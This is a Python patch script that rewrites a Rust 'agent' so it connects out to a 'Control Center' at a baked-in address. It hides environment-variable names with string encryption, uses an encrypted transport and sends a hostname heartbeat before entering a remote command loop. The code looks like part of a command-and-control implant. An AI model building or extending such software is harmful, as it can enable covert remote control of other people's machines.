import re

path = '/home/replicant/la/agent/src/outbound.rs'
with open(path, 'r') as f:
    data = f.read()

# Replace resolve_addr and resolve_secret
data = re.sub(
    r'pub fn resolve_addr\(\) -> Option<String> \{.*?\n\}',
    r'''pub fn resolve_addr() -> Option<String> {
    #[cfg(debug_assertions)]
    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_C")) { return Some(v); }
    BAKED_ADDR.map(str::to_string)
}''',
    data, count=1, flags=re.DOTALL
)

data = re.sub(
    r'pub fn resolve_secret\(\) -> Option<String> \{.*?\n\}',
    r'''pub fn resolve_secret() -> Option<String> {
    #[cfg(debug_assertions)]
    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_SECRET")) { return Some(v); }
    BAKED_SECRET.map(str::to_string)
}''',
    data, count=1, flags=re.DOTALL
)

# Rewrite connect_once to use NormalizedTransport
new_connect_once = """async fn connect_once(addr: &str, secret: &str, agent_id: &str) -> Result<()> {
    info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");

    let stream = TcpStream::connect(addr).await?;
    stream.set_nodelay(true)?;

    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
    
    let mut tls_transport = common::normalized_transport::NormalizedTransport::connect(
        stream, session, common::normalized_transport::Role::Client
    ).await?;

    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
    tls_transport
        .send(Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            agent_id: agent_id.to_string(),
            status: hostname,
        })
        .await?;

    info!("outbound-c: registered with Control Center, running command loop");

    let boxed: Box<dyn common::Transport + Send> = Box::new(tls_transport);
    let mut agent = crate::Agent::new(boxed)?;
    agent.run().await
}"""

data = re.sub(
    r'async fn connect_once.*?let mut agent = crate::Agent::new\(boxed\)\?;\s+agent\.run\(\)\.await\n\}',
    new_connect_once,
    data, count=1, flags=re.DOTALL
)

with open(path, 'w') as f:
    f.write(data)

